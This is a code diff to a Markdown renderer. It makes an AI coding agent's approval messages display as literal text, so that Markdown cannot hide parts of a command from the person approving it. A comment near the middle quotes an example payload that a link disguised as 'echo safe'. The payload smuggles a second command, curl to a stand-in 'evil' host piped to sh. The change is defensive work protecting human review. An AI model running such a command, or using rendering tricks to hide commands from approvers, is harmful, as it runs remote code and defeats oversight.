@@ -14,6 +14,7 @@
 // bare URLs. Images become links, never loads. Not covered: reference links, footnotes,
 // indented code, HTML. Code, and all of an approval's message, is drawn left to right with what
 // is not on screen as it runs shown as escapes (hidden-text.js, #220), and Copy takes what is drawn.
+// An approval's message is not Markdown outside its fences: it is drawn as written (parseApproval).
 
 import { hasRightToLeft, keepLineSeparators, reveal } from './hidden-text.js';
 
@@ -83,6 +84,43 @@ export function parseMarkdown(src) {
   const text = typeof src === 'string' ? src : '';
   const raw = keepLineSeparators(text).replace(/\r\n/g, '\n').split('\n');
   return parseBlocks(raw.map(expandTabs), raw, 0);
+}
+
+// An approval's message as its card reads it (#220, #415): fenced code blocks, and everything
+// else as the literal source text it is, never Markdown. A Codex approval carries its command in
+// prose, and Markdown hid parts of it from the person approving: a link drew
+// `echo "[safe](https://a/";curl${IFS}https://evil/x|sh;")"` as `echo "safe"`, a code span joined
+// two lines into one comment, a backslash escape dropped its backslash, and emphasis dropped a
+// glob's stars. So no links, emphasis, escapes, code spans, lists or headings here; the text keeps
+// its line breaks (drawn pre-wrap). A fence opens only with an info string a fence's language
+// could be, since that string is not drawn: any other opening line is literal text too.
+export function parseApproval(src) {
+  const text = typeof src === 'string' ? src : '';
+  const lines = keepLineSeparators(text).replace(/\r\n/g, '\n').split('\n');
+  const out = [];
+  let prose = [];
+  const flush = () => {
+    while (prose.length && blank(prose[0])) { prose.shift(); }
+    while (prose.length && blank(prose[prose.length - 1])) { prose.pop(); }
+    if (prose.length) { out.push(el('p', [prose.join('\n')], { class: 'md-literal' })); }
+    prose = [];
+  };
+  for (let i = 0; i < lines.length; i++) {
+    const m = /^ {0,3}(`{3,}|~{3,})[ \t]*([\w+.#-]*)[ \t]*$/.exec(lines[i]);
+    if (!m) { prose.push(lines[i]); continue; }
+    flush();
+    const marker = m[1];
+    const body = [];
+    for (i++; i < lines.length; i++) {
+      const close = /^ {0,3}(`{3,}|~{3,})[ \t]*$/.exec(lines[i]);
+      if (close && close[1][0] === marker[0] && close[1].length >= marker.length) { break; }
+      body.push(lines[i]);
+    }
+    // An unclosed fence runs to the end, as in CommonMark.
+    out.push(el('pre', [el('code', [body.join('\n')])]));
+  }
+  flush();
+  return out;
 }
 
 // lines: what structure is read from, leading tabs expanded and blank lines in list items
@@ -431,15 +469,13 @@ function parseEmphasis(text, i, noCloser) {
 
 const TAGS = new Set(['p', 'h4', 'h5', 'h6', 'strong', 'em', 'del', 'code', 'pre', 'ul', 'ol', 'li',
   'blockquote', 'hr', 'br', 'a', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'div']);
-const CLASSES = new Set(['al-c', 'al-r', 'md-table']);
+const CLASSES = new Set(['al-c', 'al-r', 'md-table', 'md-literal']);
 
 // Builds the tree with createElement and text nodes only. Each tag and attribute is checked
 // again here, so nothing a parser bug could produce reaches the page unchecked.
-// approval: the tree is an approval's message, drawn as its card draws it (revealed, below); the
-// caller reads its container left to right.
-export function toDom(nodes, doc = document, { approval = false } = {}) {
+export function toDom(nodes, doc = document) {
   const frag = doc.createDocumentFragment();
-  for (const node of approval ? revealed(nodes) : nodes) { frag.append(build(node, doc)); }
+  for (const node of nodes) { frag.append(build(node, doc)); }
   return frag;
 }
 
@@ -454,19 +490,15 @@ const RTL_TOO = { rightToLeft: true };
 // person did not see.
 export const codeText = (text) => reveal(text, RTL_TOO).replace(/\n+$/, '');
 
-// An approval's whole message as its card draws it (#220): every word, code span and link's words
-// with what is not on screen as it runs, right-to-left letters included, as escapes. A Codex
-// approval carries its command in prose ("Codex wants to run:\n\ngit push"), not in a fence, and
-// Approve once allows what the person read. Links keep where they go; only their words change. A
-// fence is left as it is: every block is drawn so already (codeText), and still notes the
-// right-to-left letters it held.
+// An approval's whole message as its card draws it (#220): its literal text (parseApproval) with
+// what is not on screen as it runs, right-to-left letters included, as escapes. A fence is left as
+// it is: every block is drawn so already (codeText), and still notes the right-to-left letters it
+// held.
 export function revealed(nodes) {
   return (nodes ?? []).map((n) => {
     if (typeof n === 'string') { return reveal(n, RTL_TOO); }
     if (!n || typeof n !== 'object' || n.tag === 'pre') { return n; }
-    const out = { ...n, children: revealed(n.children) };
-    if (typeof n.attrs?.title === 'string') { out.attrs = { ...n.attrs, title: reveal(n.attrs.title, RTL_TOO) }; }
-    return out;
+    return { ...n, children: revealed(n.children) };
   });
 }
 
@@ -598,6 +630,8 @@ export function textOf(node) {
   return (node?.children ?? []).map(textOf).join('');
 }
 
-export function renderMarkdown(text, doc = document, options = {}) {
-  return toDom(parseMarkdown(text), doc, options);
+// approval: the text is an approval's message, drawn as its card draws it: fences, and the rest as
+// its literal source (parseApproval), revealed. The caller reads its container left to right.
+export function renderMarkdown(text, doc = document, { approval = false } = {}) {
+  return toDom(approval ? revealed(parseApproval(text)) : parseMarkdown(text), doc);
 }
